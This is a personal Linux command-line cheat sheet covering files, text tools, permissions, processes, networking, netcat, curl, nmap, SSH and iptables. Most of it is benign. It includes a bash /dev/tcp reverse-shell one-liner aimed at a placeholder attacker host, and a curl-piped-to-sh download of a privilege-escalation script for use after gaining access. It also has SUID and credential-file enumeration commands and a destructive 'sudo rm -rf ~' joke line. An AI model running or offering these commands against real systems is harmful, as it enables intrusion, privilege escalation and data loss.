# Command Line Cheat Sheet

## Navigation

- `~`: Home
- `$`: Path end of Regular User Prompt
- `#`: Path end of Root User Prompt
- `/`: Root Directory
- `..`: Parent Directory
- `./`: Current Directory
- `*`: Wildcard (Matches any character or group of characters)
- `*`: can also mean all the files and folders of current directory
- `<` or `0`: standard input
- `>` or `1`: standard output
- `&` or `2`: standard error

### Example Path:

```bash
~/Y_E_@_S_E_EN/CSE3032/Folder1$
```

### Variables

```bash
abc=7
echo "$abc"
7
```

# List all files and folders in the current location

- `*`: all files and folders in the current location

```bash
myfiles=(\*)
echo "$myfiles"
echo "{myfiles[0]}"
echo "${myfiles[0]}"

#both stdout and stderr of the echo command are redirected to a file named output.txt. If there's an error, it will also be captured in the file.
echo "Hello, world!" >& output.txt

#This one-liner discards both stdout and stderr by redirecting them to /dev/null. It's useful when you want to suppress output.
command_that_might_produce_output >& /dev/null

#List the contents of the current directory, and if there are any errors,include them in the output,then display everything using cat.
#2>&1 means "redirect standard error to the same location as standard output."
#By default, when you run a command, stdout and stderr are separate. 2>&1 is used to merge them, so both regular output and error messages are directed to the same place.
ls 2>&1 | cat

#see the user name
whoami

# Clear terminal
clear

# Print current directory
pwd

# List files and folders
ls

# List all files and folders (including hidden ones)
ls -A

#list all files and directories in the current directory and its subdirectories
ls *

#List all of the files in the current directory and all of its subdirectories that end in ".txt"
ls */*txt

#This will output a comprehensive set of information about the file "myfile.txt."
stat abc.txt

#In string format, %U represents the username of the file owner.
stat --format "%U" abc.txt

#This would display a custom format with file name, size, owner, and group information.
stat --format "File: %n Size: %s bytes Owner: %U Group: %G" abc.txt

# Create a folder
mkdir Folder1

# Change directory
cd Folder1

# Move back to the parent directory
cd ..

# Create a folder with spaces
mkdir "child number three"
mkdir child\ number\ three
mkdir "my tree speaks as if I didn't"
mkdir a\'b
mkdir a\*b
mkdir a\\b

# Remove a directory
rmdir my

# Remove a file
rm abc.txt

#Multiple folder creation and deletion
mkdir a b c d e f g h i j
rmdir a b c d e f h g j i

#Recursively delete a folder and its children
rm -r childOfFolder1

#* == all files in a folder
cat *
ls *
#: Copies all files and folders in the current directory to the specified destination.
cp * destination_path


#Run multiple cmds in a single line: first ls will execute, then date
ls ; date

#Run "date" if "ls" is successful
ls && date

#Run "date" if "ls" is not successful: date will not execute
ls || date

#Run "date" if "lk" is not successful: date will execute as "lk" command is failed
lk || date
```

# File manipulation

```bash
# Open a text file in the nano editor
nano abc.txt
#If you want to write something, then type what you want to write at this step.
#Press ctrl+X
#Type 'y'
#Press 'Enter' Button

# Open a text file in the vim editor
vim newfile.txt
#follow vim's features

# Move a file
mv abc.txt LocationToMove
mv full_path_of_SOURCE_FILE full_path_where_to_move

# Rename a file
mv abc.txt superman.txt

# Copy a file
cp abc.txt LocationToMove
cp full_path_of_SOURCE_FILE full_path_where_to_move

# Display file content
cat superman.txt

# Display line numbers in a file
cat -n superman.txt

# Display end-of-line characters in a file
cat -e superman.txt

# Display both line numbers and end-of-line characters
cat -ne superman.txt

#get the type of file
file superman.txt

```

# Text Manipulation

## Concatenation and Appending

```bash
# Concatenate files
cat batman.txt superman.txt > batmanvssuperman.txt

# Append content to a file
cat wonderwoman.txt >> batmanvssuperman.txt


#put standard output of the "ls -A" command to file.txt
ls -A > file.txt

#append standard output of the "cat file2.txt" command to file.txt
cat file2.txt >> file.txt

#Discard stdout of ls command
ls > /dev/null

#pipelining: the output of "ls -A" will be the input to "wc -l" command
ls -A | wc -l

# Print lines 10 to 15 of a file
sed -n '10,15p' file1.txt

# Append lines 10 to 15 of file1.txt to file2.txt
sed -n '10,15p' file1.txt >> file2.txt

#extracting human-readable text from "data.txt" and searching for lines containing the exact string '==' in a case-insensitive manner
strings data.txt | grep -wi '=='

#decoding a Base64-encoded content from "data.txt" and revealing its original form
cat data.txt | base64 --decode

#Create Hex Dump from a File: This will display the hexadecimal representation along with ASCII characters of each byte in "data.txt."
xxd data.txt

#Create Hex Dump and Redirect to a File: Saves the hex dump of "data.txt" to a file named "hexdump.txt."
xxd data.txt > hexdump.txt

#Convert Hex Dump Back to Binary: Takes the hex dump from "hexdump.txt" and converts it back to binary, saving it as "original_data."
xxd -r hexdump.txt > original_data

#first create hexdump of abc.txt and feed it to xxd with -r option to print the orginal binary ouput
xxd abc.txt | xxd -r

#Hex Dump with Line Numbers: Displays hex dump with 8 bytes per line and includes line numbers.
xxd -c 8 data.txt

#Extracts the second field using a pipe (|) as the delimiter.
echo "name|age|gender" | cut -d '|' -f 2

#This extracts the first and third fields from a CSV file where commas (,) are the delimiters.
cut -d ',' -f 1,3 file.csv
```

# Basic File Comparison and Similarities: Difference using diff cmd

```bash
#Basic File Comparison:
diff file1.txt file2.txt

#Unified Diff Format: Provides a unified diff format, which is often easier to read and understand.
diff -u file1.txt file2.txt

#Recursive Directory Comparison:Compares files in "dir1" and "dir2" recursively.
diff -r dir1 dir2

#Ignores whitespace differences in the comparison.
diff -w file1.txt file2.txt

#Creates a patch file containing the differences between the two files.
diff -u file1.txt file2.txt > my_patch.patch

#taking the contents of "data.txt," sorting them, and then keeping only the unique lines.
cat data.txt | sort | uniq -u

#frequencies per line of a txt file
sort abc.txt | uniq -c

#In order to sort the output with the most frequent lines on top, you can do the following
sort abc.txt | uniq -c | sort -nr

#to get only duplicate lines, most frequent first:
sort abc.txt | uniq -cd | sort -nr

#Say, you have two files and you want to get the actual content of the common lines:
#-F treats the patterns as fixed strings, -x matches whole lines, and -f specifies the file with the patterns.
grep -Fxf <(sort abc.txt) <(sort def.txt)

#you can also use comm command to get the same output as well
comm -12 <(sort abc.txt) <(sort def.txt)
```

# Word Count

```bash
# Count lines, words, characters, and bytes in a file
wc -lwmc filename

# Count lines, words, and characters in a file but using pipelining
cat filename | wc -lwmc

# Count lines, words, and characters in all files in the current directory
cat * | wc -lwmc
```

# File Search

```bash

#Get the files whose capabilities are set
getcap -r / 2>/dev/null

#find binary/source for command
whereis ls


#we want to search a file and want to avoid anything you haven't access to parts of the filesystem
find / -name "index.html" 2>/dev/null
find / -name "index.html" 2>&-


# Find files with a specific name
#here, . is for current directory * is for pattern matching
find . -type f -name abc.txt
find . -type f -name 'm*l.txt'
find . -type f -iname 'p*m*l.*'

# Delete all PDF files in a directory
find . -type f -name "*.pdf" -exec rm -f {} \;

#find: This command is used to search for files and directories in a directory hierarchy.
#.: Specifies the starting directory for the find command. In this case, it starts the search from the current directory.
#-type f: Specifies the type of the found items. In this case, it looks for regular files.
#-name "*.pdf": Filters the search based on the name of the files. Here, it's looking for files with names ending in ".pdf".
#-exec: Executes a command on the files found by find.
#rm -f {}: The command to be executed. It removes files forcefully (-f). {} is a placeholder for each file found by find, and it gets replaced by the actual file names.
#\;: Indicates the end of the -exec command. It needs to be terminated with a semicolon.


# Display the content of all text files
find . -type f -name "*.txt" -exec cat {} \; | wc -lw

#to know which file contains ASCII character that means human readable
find . -type f -exec file {} + | grep ASCII

#to extract many things
find . -type f -user bandit7 -group bandit6 -size 33c 2>/dev/null -exec file {} + | grep ASCII

#find non executable 1033bytes file and contains ASCII characters
find .
	-type f
	-size 1033c
	-not -executable
  2>/dev/null
	-exec file {} +
	| grep ASCII


#find files with the 777 permissions (files readable, writable, and executable by all users)
find / -type f -perm 0777

#find executable files
find / -perm a=x

#find all files under user under /home
find /home -user whoami

#files that were modified in the last 10 days
find / -mtime 10

#files that were accessed in the last 10 day
find / -atime 10

#files changed within the last hour (60 minutes)
find / -cmin -60

#files accesses within the last hour (60 minutes)
find / -amin -60

#This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size.
find / -size +100M -type f 2>/dev/null
find / -size -100M -type f 2>/dev/null

#find world-writable folders
find / -perm -o w -type d 2>/dev/null

#find world-executable folders
find / -perm -o w -type d 2>/dev/null
find / -name gcc*

#Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.
find / -perm -u=s -type f 2>/dev/null

```

# Searching Patterns

## rg command

```bash
#The rg command is a fast, ripgrep line-oriented search tool that recursively searches your current directory for a regex pattern.
#You may need to install it

#Searches for the specified pattern in the file.txt file.
rg "pattern" file.txt

#Recursive Search in Current Directory:
rg "pattern"

#Case-Insensitive Search:
rg -i "pattern"

#Search for Whole Words Only:
rg -w "pattern"

#Search for Lines Not Matching a Pattern:
rg -v "pattern"

#Count the Number of Matches:
rg -c "pattern"

#Search for Files Containing the Pattern:
rg -l "pattern"

#Search for a Specific File Type with a pattern:
rg --type md "pattern"

#Search for Multiple Patterns (OR): Searches for lines containing either pattern1 or pattern2.
rg "pattern1|pattern2"

#Search for Multiple Patterns (AND): Searches for lines containing both pattern1 and pattern2.
rg -e "pattern1" -e "pattern2"

#Exclude Files or Directories: Excludes files listed in skip.txt and the directory named exclude_folder from the search.
rg "pattern" --ignore-file=skip.txt --ignore-dir=exclude_folder

```

## Grep commands

```bash
#-o == only matched part will be portrayed
#-i == case insensetive
#-w == only for matched WORD
# Grep command with options
grep -oi 'c' batman.txt | wc -w
grep -owi 'man' batman.txt | wc -w

# Grep with head and tail
head -n 3 superman.txt | grep -o 'o' | wc -w
tail -n 3 superman.txt | grep -o 'o' | wc -w

# Combined Grep
{ grep -ow 'ASUS' batman.txt && grep -owi 'ASUS' superman.txt } | wc -w

#Q0. Find the number of the occurences of 'man' in the first seven lines of the superman.txt file.
head -n 7 superman.txt | grep -o 'man' | wc -l

#Q1. Write a command line that can print the frequencies of a string that starts with ‘p’ and ends with ‘t’ in the last 20 lines of abc.txt file and the first seven
lines of pqr.txt file. [Use regex]

{ tail -n 20 abc.txt | grep -oi 'p*t' && head -n 7 superman.txt | grep -o 'p*t'} | wc -w


# Count occurrences in the first seven lines
head -n 7 superman.txt | grep -o 'man' | wc -l

```

# Permissions and Operations

```bash
# Change file permissions
#Permission:: r = read; w = write; x = execute
#Owner's Permission	 group's permission         random users' permission
#     Current:    rwx rwx rwx
#                 111 111 111
#      After:      -wx r-x ---
#		  011 101 000
chmod 350 filename

#      After:      rwx r-x ---
#		  111 101 000
chmod 750 filename

#recursively change on all subdirectories as well
chmod -R 744 folderName

#to give all permission
chmod +x script.sh

#Grants read (r) and write (w) permissions to the owner (u) of the directory.
chmod -R u+rw folder

#Remove read write and execute bits for "other" and "group" on all files in folder
chmod -R og-rwx

# Give other and group the same rights as user, but removing writing rights.
chmod -R og=u-w folder

#Sticky Bit (t): When the sticky bit is set on a directory, only the owner of a file within that directory can delete or rename the file. It's commonly used on directories like /tmp to prevent users from deleting or modifying each other's files.
#Represented by a lowercase "t" in the "others" permission of the directory.
chmod +t directory

#setting the sticky bit on a directory for others (everyone else, not the owner).after running this command, the sticky bit will be set for others on the specified directory.
chmod o+t folder

#Setuid (s) and Setgid (s) Bits:
#Setuid (s) and setgid (s) are special permissions that can be set on executable files.
#Setuid: When set on an executable file, it runs with the privileges of the file owner.
#Setgid: When set on an executable file, it runs with the privileges of the group owner of the file.
#Represented by an uppercase "S" (if the corresponding execute bit is not set) or "s" (if the execute bit is set).
chmod u+s executable_file   # Setuid
chmod g+s executable_file   # Setgid
```

# Process Commands Cheat Sheet

## Display Process Information

```bash
#View all running processes
ps -A

#View process tree (see the tree formation until ps axjf is run below)
ps axjf

#Display information about active processes.
ps -ef

#Display detailed information about all processes.
ps aux

#Display processes owned by the current user
ps -u whoami

# Count instances of 'Google Chrome' processes
pgrep 'chrome' | wc -w

#List process IDs based on the current user name.
pgrep -u whoami

#Kill process with name java
pkill -f "java"

#Kill all processes with names beginning java
killall "java"
```

## Process Management

```bash
#Terminate a process by its process ID.
kill 1234

#Terminate all processes with a specific name.
killall firefox

#Signal processes based on their name.
pkill chrome

#Display and update sorted information about system processes.
top

#An interactive process viewer.
htop

#Forcefully terminate a process.
kill -9 5678
```

## Resource Usages

```bash
#Display disk space usage of file systems.
df -h
# Display disk usage of files and directories.
du -h
```

## Job Scheduling

```bash
#o schedule a job using command lines in Unix-like systems (including Linux), you can use the cron service. cron is a time-based job scheduler in Unix-like operating systems.
#Use the following command to open the crontab editor:
crontab -e

#The general syntax for a cron job is as follows:
* * * * * command_to_be_executed
#Each * represents a time unit, and the five *'s correspond to minutes, hours, days of the month, months, and days of the week, respectively.

#the following cron job runs the command /path/to/your/command every day at 2:30 AM:
30 2 * * * /path/to/your/command
#30: Minutes (0-59)
#2: Hours (0-23)
#*: Every day of the month (1-31)
#*: Every month (1-12)
#*: Every day of the week (0-6, where Sunday is 0)
#Save and Exit like nano or vim editor

#View Scheduled Jobs
crontab -l

#The following rsync backup command will run every 10 minutes
*/10 * * * * rsync -a -delete -e ssh webgoat@192.168.56.102:/home/webgoat /opt/backup

#this command will run every two hours
* */2 * * * command

#To check what the jobs are run from syslog
cat /var/log/syslog | grep CRON
```

### Aliases

```bash
#Temporary alias for 'ls'
alias what='ls'
what
#what command will print the list of files and folders of the current directory

#For permanent change, append the alias to .bashrc
```

# Find & Replace with Sed

```bash
# Basic find and replace
sed 's/unix/linux/' geekfile.txt
#Here the “s” specifies the substitution operation. The “/” are delimiters. The “unix” is the search pattern and the “linux” is the replacement string.
#By default, the sed command replaces the first occurrence of the pattern in each line and it won’t replace the second, third…occurrence in the line.

# Replace second occurrence
sed 's/unix/linux/2' geekfile.txt

# Global replacement
sed 's/unix/linux/g' geekfile.txt

# Replace on a specific line number
sed '3 s/unix/linux/' geekfile.txt

#Replacing string on a range of lines :
sed '1,3 s/unix/linux/' geekfile.txt

#Here $ indicates the last line in the file.
sed '2,$ s/unix/linux/' geekfile.txt
```

## Deletion with sed

```bash
# Delete a specific line
sed '5d' filename.txt

# Delete the last line
sed '$d' filename.txt

# Delete lines in a range
sed '3,6d' filename.txt

# Delete from nth to last line
sed '12,$d' filename.txt

# Delete pattern matching line
sed '/abc/d' filename.txt
```

## Nwtworking

```bash
#Check whether you have any network connection
ping 8.8.8.8
ip addr
ip a
ip link
ip addr show eth0

#This command will show the DNS server(s) configured on your system.
cat /etc/resolv.conf

#This command will display the routing table, which includes information about how network traffic is directed.
ip route

#This command will show the MAC address of your Ethernet interface.
ip link show eth0

#This command will provide detailed information about the specified Ethernet interface, including IP addresses, MAC address, DNS servers, and more.
nmcli device show eth0

#This command adds a default route to the system's routing table. A default route is used when there is no specific route for a destination IP address. In this case, any traffic that doesn't match a more specific route will be directed to the next hop specified by the IP address 192.168.56.10.
sudo ip route add default via 192.168.56.10
```

## connecting to wifi from linux terminal

```bash
#For Linux
#Say, wlan0 is down
sudo ifconfig wlan0 up
nmcli radio wifi
#if diseabled
nmacli radio wifi on

nmcli dev wifi list
#Or
sudo iw wlan0 scan | grep SSID

sudo nmcli --ask dev wifi connect <SSID>
ping www.google.com

#lists all the available interfaces.
nmcli con show
nmcli con show --active
```

# Explaining the `lshw -C network` Command

## Overview

The `lshw` command is a hardware information tool available on Linux systems. When used with the `-C` flag followed by a specific class (in this case, `network`), it provides detailed information about the network hardware on your system.

## Command Syntax

```bash
lshw -C network

#lshw: This is the main command for listing hardware information.
#-C network: The -C flag specifies the class of hardware you want information about, and in this case, it's set to network.
sudo ifup <logical_name_of_interface>

sudo ifdown <logical_name_of_interface>
```

# Netcat (nc) Command Examples

## 1. Basic Usage - Listening on a Port

```bash
#Basic Chat application:
#- `l`: Listen mode, for inbound connections.
#- `p` 1234: Specifies the port to listen on (replace 1234 with your desired port).
#- `v`: verbose mode, i.e., Display more information about the connection.
#server(localhost) is listening at 1234
nc -lvp 1234
#Client from another tab connects to the loacthost server at 1234
nc localhost 1234
```

## 2. Basic Usage - Connecting to a Host and Port

```bash
#Connects from CLIENT to the host at IP address 10.0.2.5 on port 1234.
nc 10.0.2.5 1234

#Listens on port 1234 and saves the received data to a file named received_file.txt.
nc -l -p 1234 > received_file.txt
#Connects to the host at IP address 10.0.2.5 on port 1234 and sends the contents of file_to_send.txt.
nc 10.0.2.5 1234 < file_to_send.txt
```

## 3. A reverse shell attack

```bash
#Say attacker is listening at 1234
nc -lvp 1234

#the following one-liner has to executed from the victim's machine
#it could be done if the victim is running any unpatched version software that can execute shell command
bash -i >& /dev/tcp/[attacker IP]/[attacker port] 0>&1
#bash -i: This starts an interactive Bash shell.
#>&: This is a redirection operator that combines the standard output (stdout) and standard error (stderr).
#/dev/tcp/[attacker IP]/[attacker port]: This part is using Bash's built-in functionality to create a TCP connection to the specified IP address and port. It essentially connects the shell to a remote machine.
#0>&1: This redirects the input (stdin) to the combined stdout and stderr, completing the connection.
```

# The mighty curl!

```bash
#This command downloads a file from the specified URL (https://example.com/file.txt) and saves it with the same name locally.
curl -O https://example.com/file.txt

#The --progress-bar option displays a progress bar during the download.
curl -O https://example.com/largefile.zip --progress-bar

#Sending Data with a POST Request:This sends a POST request to the specified URL (https://example.com/api) with the specified data.
curl -X POST -d "param1=value1&param2=value2" https://example.com/api

#Sending JSON Data in a POST Request:This example sends a POST request with JSON data to an API.
curl -X POST -H "Content-Type: application/json" -d '{"key": "value"}' https://example.com/api

#Uploading a File:This uploads a local file (localfile.txt) to an FTP server.
curl -T localfile.txt ftp://ftp.example.com/upload/

# Authenticating with Basic Auth:
curl -u username:password https://example.com/api

#Displaying HTTP Headers:The -I option fetches the headers only, without downloading the body content.
curl -I https://yeaseen.github.io

#This command is effectively saying: "Download the file from the specified URL (https://example.com), follow any redirects (-L), and save it locally with the same name as the remote file (-O). Additionally, download the entire content of the file (-r with no specified range).
curl -O -L -r https://example.com

```

# Scanning a network with netstat and nmap:

### netstat

```bash
#, displays active network connections on your system, focusing on listening (-l), port number(-n), TCP (-t) and UDP (-u) connections. Handy for checking what ports are in use and who's knocking on your network door.
netstat -lntu

#-l: list ports listening and -t for tcp listeners
netstat -lt

#list network usage statistics by protocol (below) This can also be used with the -t or -u options to limit the output to a specific protocol.
netstat -s

#statustics for tcp protocol channels
netstat -st

#list connections with the service name and PID information.
netstat -tp

#Shows interface statistics
netstat -i

#-a:Dsiplay all sockets; -n:Don't resolve names; -o:Display timers
netstat -ano
```

### nmap

```bash
#Basic Scan: Performs a basic scan on the specified target IP address.
nmap target_ip

#cans only the specified ports (80 and 443 in this case) on the target IP.
nmap -p 80,443 target_ip

#Service Version Detection: Attempts to detect service versions running on open ports.
nmap -sV target_ip

#Tries to identify the operating system of the target.
nmap -O target_ip

#Scans multiple targets.
nmap target1_ip target2_ip

#you're scanning ports 31000 to 32000 on your own machine
nmap -p 31000-32000 localhost

#Excludes a specific IP address from the scan.
nmap target_ip --exclude excluded_ip
```

# Extract and Create zip files

```bash
#To extract tar.gz archive. -x: Extract files from an archive. -z: Decompress the archive using gzip. -v: Verbose mode, showing the files being extracted. -f: Specify the archive file name.
tar -xvzf archive.tar.gz

#To extract tar.bz2 archive
tar -xvjf archive.tar.bz2

#To extract tar archive
tar -xvf archive.tar

#To create archive; -c: Create a new archive. -z: Compress the archive using gzip. -v: Verbose mode, showing the files being archived.-f: Specify the archive file name.
tar -cvzf archive.tar.gz /file_or_folder/to/archive

#This command creates a zip file named archive.zip containing file1.txt, file2.txt, and the contents of the folder/ directory.
zip archive.zip file1.txt file2.txt folder/

#This command extracts the contents of archive.zip into the current directory.
unzip archive.zip

#This will extract the contents of archive.zip into the specified destination directory.
unzip archive.zip -d /path/to/destination/
```

# Special Commands

```bash
#Will print system information giving us additional detail about the kernel used by the system
uname -a

#The proc filesystem (procfs) provides information about the target system processes
cat /proc/version

#info about OS
cat /etc/issue

#The sudo -l command can be used to list all commands your user can run using sudo.
sudo -l

#The id command will provide a general overview of the user’s privilege level and group memberships.
id

#Reading the /etc/passwd file can be an easy way to discover users on the system.
cat /etc/passwd

#just print all user names as well system or service users
cat /etc/passwd | cut -d ":" -f 1

#to get the user names only as oftentimes, they will be under home directory
cat /etc/passwd | grep home | cut -d ":" -f 1

#show system date time
date

#to get current date and time: 2023-11-11_11-11-27
echo $(date +'%Y-%m-%d_%H-%M-%S')

#show uptime
uptime

#Show mounted file system
mount

#After running following command, the files and directories on the device /dev/sdb1 will be accessible under the /mnt/mydisk directory.
sudo mount /dev/sdb1 /mnt/mydisk

#to print all the prev commands from bash history file
history

#run a prev command from histrory
!<the line_number_of_command_from_history_command>

#Show enviro­nment variables
env

sudo reboot

sudo shutdown -h now

sudo poweroff

logout

#bash one-liner
#Renames all files with the .jpg extension by adding a prefix.
for file in *.jpg; do mv "$file" "newprefix_$file"; done
```

# In the same network,(Host and Virtual Oses) File Transfer between two machines using python server

```bash
#Start the HTTP server on the machine with the file you want to share:
#Open host/server terminal, navigate to the directory containing the file, and run:
python3 -m http.server 80

#From client terminal:
wget http://<SERVER_IP>/<file_name>
#Or
#Access the server from another machine:
#Open a web browser on the second machine and enter the IP address or hostname of the first machine, followed by the port number.
http://<SERVER_IP>:80
```

# SSH-ing

```bash
#Connecting to a remote/another machine
ssh -p <PORT> username@ip_addr

#Set-up client for SSH-ing to host
#Step-1: Generate a public-private key pair
mkdir ~/.ssh
cd .ssh
ssh-keygen -t rsa -b 4096 -o -a 100
chmod 600 *
#Step-2: Copy your public key to host's ~/.ssh/authorized_keys file
#The following command connects to the specified remote host as the specified user
#Put the user's password on the remote host PC
ssh-copy-id <username>@<hostname>


#-->How to modify default SSH port 22 to something new: change in SSH configuration file
nano /etc/ssh/sshd_config
#Look for the line that starts with Port. It will specify the port number that SSH is configured to use.
#Change it by replacing 22 with your NEW_PORT
Port <NEW_PORT>
service ssh restart
```

# Copy files between two different network remotely

```bash
#copy file(s) from the host to your client (note the capital -P)
scp -P <PORT> username@host_ip_addr:path_to_src local_dest

#copy file(s) from your client to the host (note the capital -P)
scp -P <PORT> local_src username@host_ip_addr:path_to_dest
```

# Linux Firewall Command [iptables]

```bash
#Check Current Rules:
iptables -L

#Flush all Rules, effectively turning off the firewall
iptables -F

#Allow Incoming SSH (replace 22 with your SSH port if it's different): ssh config file located at /etc/ssh/sshd_config
iptables -A INPUT -p tcp --dport 22 -j ACCEPT

#Allow Incoming HTTP (port 80):
iptables -A INPUT -p tcp --dport 80 -j ACCEPT

#Allow all Outgoing Connections:
iptables -A OUTPUT -j ACCEPT

#Deny All Incoming Traffic:
iptables -A INPUT -j DROP

#Save them so they persist after a reboot
service iptables save

#Start/Stop/Restart Firewall:
service iptables start
service iptables stop
service iptables restart
```

# What after getting access to a machine?

```bash
#Screen the machine automatically by LinPEAS - Linux Privilege Escalation Awesome Script
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

# AWESOME LINUX USER

```bash
#After all these, don't ever try this.
sudo rm -rf ~
```
